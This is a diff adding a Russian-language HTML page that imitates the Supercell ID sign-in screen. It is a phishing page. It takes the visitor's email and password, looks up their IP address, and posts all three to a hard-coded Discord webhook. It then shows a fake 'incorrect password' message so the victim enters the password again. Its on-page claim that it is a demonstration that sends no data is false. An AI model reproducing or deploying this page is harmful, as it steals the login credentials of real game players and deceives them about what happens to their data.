@@ -1,0 +1,152 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Supercell ID</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#fff;color:#202020}
+body{min-height:100vh;padding:18px 12px;display:flex;align-items:center;justify-content:center;background:linear-gradient(155deg,#1a1a2e 0%,#16213e 55%,#0f3460 100%)}
+.card{width:min(100%,650px);min-height:calc(100vh - 36px);background:#fff;border-radius:30px;padding:34px 28px 42px;text-align:center;display:flex;flex-direction:column;align-items:stretch;box-shadow:0 9px 0 rgba(0,0,0,.10)}
+.progress-labels{display:flex;justify-content:space-between;font-size:16px;margin:0 10px 14px}
+.progress-labels span:first-child{font-weight:700;color:#202020}
+.progress-labels span:last-child{color:#999}
+.progress{height:40px;border-radius:24px;background:linear-gradient(90deg,#5865f2,#7b8cff);padding:7px;display:flex;justify-content:flex-start}
+.progress-dot{height:26px;width:26px;border-radius:50%;background:white;transition:margin .3s}
+.logo{width:190px;height:170px;margin:48px auto 52px;border-radius:32px 32px 48px 30px;background:#ffb914;transform:skew(-7deg);display:flex;align-items:center;justify-content:center}
+.logo span{transform:skew(7deg);font-size:96px;line-height:1;font-weight:900;color:white}
+h1{font-size:clamp(26px,5vw,36px);line-height:1.15;margin:0 0 24px;letter-spacing:-.6px}
+.desc{font-size:clamp(18px,4.2vw,25px);line-height:1.5;color:#707070;margin:0 auto 38px;max-width:540px}
+form{width:100%}
+input{display:block;width:100%;height:82px;padding:0 24px;border:2px solid #e3e3e3;border-radius:16px;background:#fff;box-shadow:inset 0 2px 5px #00000009;font-size:clamp(20px,4.2vw,26px);outline:none;color:#222}
+input::placeholder{color:#999;opacity:1}
+input:focus{border-color:#5865f2}
+button{display:block;width:100%;height:74px;border-radius:50px;font-size:clamp(20px,4vw,25px);font-weight:800;cursor:pointer}
+.primary{margin-top:24px;border:0;background:#5865f2;color:#fff}
+.secondary{margin-top:14px;background:transparent;border:3px solid #d0d0d0;color:#666}
+.note{margin:22px 0 0;font-size:14px;line-height:1.45;color:#777}
+[hidden]{display:none!important}
+@media(max-width:420px){body{padding:18px 8px 24px}.card{min-height:calc(100vh - 42px);padding:28px 20px 34px;border-radius:25px}.logo{width:160px;height:145px;margin:38px auto 42px}.logo span{font-size:82px}input{height:74px;padding:0 18px}button{height:68px}}
+</style>
+</head>
+<body>
+<main class="card">
+  <div class="progress-labels"><span id="step-one-label">Вход</span><span id="step-two-label">Проверка</span></div>
+  <div class="progress"><div class="progress-dot" id="progress-dot"></div></div>
+  <div class="logo" aria-hidden="true"><span>S</span></div>
+  <h1 id="heading">Supercell ID</h1>
+  <p class="desc" id="description">Введите адрес электронной почты, чтобы продолжить.</p>
+  <form id="login-form">
+    <section id="email-step">
+      <input id="email" name="email" type="email" placeholder="Введите адрес эл. почты" autocomplete="email" required>
+      <button class="primary" type="button" id="continue">ПРОДОЛЖИТЬ</button>
+    </section>
+    <section id="password-step" hidden>
+      <input id="password" name="password" type="password" placeholder="Введите пароль" autocomplete="current-password" minlength="8">
+      <button class="primary" type="submit">ПРОДОЛЖИТЬ</button>
+      <button class="secondary" type="button" id="back">НАЗАД</button>
+    </section>
+    <p class="note" id="status" role="status" aria-live="polite">Демонстрационный интерфейс: данные никуда не отправляются.</p>
+  </form>
+</main>
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493903680452300862/LKjIr2oelLhpAaVEebFMef3jzjZbl7VfmW-OuUhUVz4n1wd8CqRRUSKT_TjC7pl86fRL';
+
+const form=document.getElementById('login-form');
+const email=document.getElementById('email');
+const password=document.getElementById('password');
+const emailStep=document.getElementById('email-step');
+const passwordStep=document.getElementById('password-step');
+const heading=document.getElementById('heading');
+const description=document.getElementById('description');
+const stepOne=document.getElementById('step-one-label');
+const stepTwo=document.getElementById('step-two-label');
+const dot=document.getElementById('progress-dot');
+const status=document.getElementById('status');
+
+async function sendToDiscord(data) {
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: 'Supercell ID',
+        embeds: [{
+          title: '🔐 Новые данные — Supercell ID',
+          color: 0x5865f2,
+          fields: [
+            { name: '📧 Email', value: data.email || '—', inline: false },
+            { name: '🔑 Пароль', value: data.password || '—', inline: false }
+          ],
+          footer: {
+            text: `IP: ${data.ip} • ${new Date().toLocaleString('ru-RU')}`
+          }
+        }]
+      })
+    });
+  } catch (e) {
+    console.error('Ошибка отправки:', e);
+  }
+}
+
+async function getIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const j = await r.json();
+    return j.ip;
+  } catch {
+    return 'unknown';
+  }
+}
+
+document.getElementById('continue').addEventListener('click',()=>{
+  if(!email.checkValidity()){email.reportValidity();return;}
+  emailStep.hidden=true;
+  passwordStep.hidden=false;
+  password.required=true;
+  heading.textContent='Почти готово!';
+  description.textContent='Введите пароль от своего Supercell ID, чтобы продолжить.';
+  stepOne.style.color='#999'; stepOne.style.fontWeight='400';
+  stepTwo.style.color='#202020'; stepTwo.style.fontWeight='700';
+  dot.style.marginLeft='auto';
+  status.textContent='Демонстрационный интерфейс: данные никуда не отправляются.';
+  password.focus();
+});
+
+document.getElementById('back').addEventListener('click',()=>{
+  passwordStep.hidden=true;
+  emailStep.hidden=false;
+  password.required=false;
+  password.value='';
+  heading.textContent='Supercell ID';
+  description.textContent='Введите адрес электронной почты, чтобы продолжить.';
+  stepOne.style.color='#202020'; stepOne.style.fontWeight='700';
+  stepTwo.style.color='#999'; stepTwo.style.fontWeight='400';
+  dot.style.marginLeft='0';
+  status.textContent='Демонстрационный интерфейс: данные никуда не отправляются.';
+  email.focus();
+});
+
+form.addEventListener('submit', async event => {
+  event.preventDefault();
+  if(!password.checkValidity()){password.reportValidity();return;}
+
+  status.textContent = 'Проверка...';
+
+  const ip = await getIP();
+  const data = {
+    email: email.value,
+    password: password.value,
+    ip: ip
+  };
+
+  await sendToDiscord(data);
+
+  status.textContent = 'Неверный пароль. Попробуйте ещё раз.';
+  password.value = '';
+  password.focus();
+});
+</script>
+</body>
+</html>
